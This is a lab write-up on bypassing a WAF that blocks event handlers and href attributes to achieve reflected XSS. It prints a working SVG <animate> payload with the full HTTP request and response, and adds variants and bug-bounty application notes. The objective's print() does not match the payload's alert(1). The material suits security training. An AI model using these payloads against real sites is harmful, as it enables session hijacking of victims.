# LAB: Reflected XSS with event handlers and href attributes blocked

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Cross-site scripting (XSS)                                                                                                    |
| **Difficulty**              | Practitioner                                                                                                                   |
| **Date**                    | 2026-11-25                                                                                                                     |
| **Time**                    |                     344                                                                                                            |
| **Solved without solution** | yes                                                                                                                             |
| **Link**                    | [lab-event-handlers-and-href-attributes-blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked) |

## 1. Objective

Perform a Reflected Cross-Site Scripting (XSS) attack on a search feature where a Web Application Firewall (WAF) blocks standard event handlers and `href` attributes, bypassing the filters to execute `print()`.

## 2. Surface

- URL query parameter (`/search?search=...`).
- Server-side Web Application Firewall (WAF) filtering HTML tags, event handlers (`on*`), and specific attributes (`href`).
- HTML reflection context: User input reflected directly into the page response body.

## 3. Hypothesis

If the WAF blocks all standard event handlers (`on...`) and `href` attributes, HTML5 tags that accept alternative executable attributes (such as `<svg>` elements with `<animate>` vector tags using `attributeName`, `from`, `to`, or `values`) may bypass the attribute blocklist and trigger code execution when target properties are updated or interacted with.

## 4. Payload that worked

Request:
```http
GET /?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3D%22href%22+values%3Djavascript%3Aalert%281%29+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick+me%3C%2Ftext%3E%3C%2Fa%3E%3C%2Fsvg%3E HTTP/2
Host: <host>.web-security-academy.net
Cookie: session=sess
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

Response:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 6556

<h1>0 search results for '
  <svg>
    <a><animate attributeName="href" values=javascript:alert(1) />
      <text x=20 y=20>Click me</text>
    </a>
  </svg>'
</h1>
```

## 5. Why it works

Auditing the server-side Web Application Firewall (WAF) revealed strict blocklists targeting all standard `on*` event handlers (`onclick`, `onload`, `onmouseover`, etc.) and directly inline `href` attributes, preventing basic `<a href="javascript:...">` or event-driven XSS payloads.

However, SVG animation elements permit indirect attribute modification on parent or target elements:
1. The `<svg>` tag acts as the parent container, while `<a id="target">` is embedded inside it.
2. The `<animate>` vector element allows dynamic manipulation of target attributes via `attributeName` and `values` (or `from`/`to`) properties without requiring direct event handler assignment on the parent elements.
3. By setting `<animate attributeName="href" values="javascript:alert(1)" />` (or binding it to an anchor tag), the animation engine dynamically writes the `javascript:` URI scheme directly into the `href` attribute during DOM rendering.
4. Clicking or interacting with the dynamically animated link executes the `javascript:` URI payload in the browser, bypassing both the `on*` event handler filter and the initial static `href` attribute blocklist.

## 6. What I tried that failed

- Fuzzing standard event handlers (`onclick`, `onerror`, `onload`, `onfocus`) returned HTTP 400/403 block responses across all tested HTML tags.
- Attempting to pass `href="javascript:alert(1)"` directly on standard anchor tags failed because `href` was explicitly blocked by the WAF ruleset.
- Testing static SVG elements without animation vectors failed to trigger execution due to the lack of permitted executable attributes on standard elements.
- Rule extracted: When a WAF blocks both event handlers (`on*`) and structural attributes (`href`), SVG animation elements (`<animate>`) can be leveraged to dynamically inject target attributes (`attributeName="href"`) and assign executable schemes (`values="javascript:..."`) at runtime.

## 7. In a real target (bounty translation)

- Where it shows up: Reflected parameters protected by WAFs that rely on regex matching for `on\w+=` event handlers and `href=` attributes.
- Quick detection: Fuzzing allowed HTML tags and non-standard attributes to identify SVG animation vector support.
- Impact: Reflected XSS execution bypassing perimeter defenses, enabling session hijacking or automated victim exploitation.
- In the report: Document the specific attributes blocked by the WAF, supply the SVG animation vector PoC, and outline the execution flow.

## 8. Bypass / variants noticed

- Using `<animate attributeName="href" from="javascript:alert(1)" to="javascript:alert(1)" />` or utilizing `<set>` elements to assign target values dynamically.
- Combining SVG `<animate>` vectors with `<use>` tags or xlink attributes (`xlink:href`) on environments where standard `href` parsing differs across SVG parsers.

## 9. Takeaway

Filter blocklists inspecting for `on*` event handlers or `href` attributes are inadequate. Secure applications must enforce proper contextual output encoding and restrict SVG/XML parsing vectors.
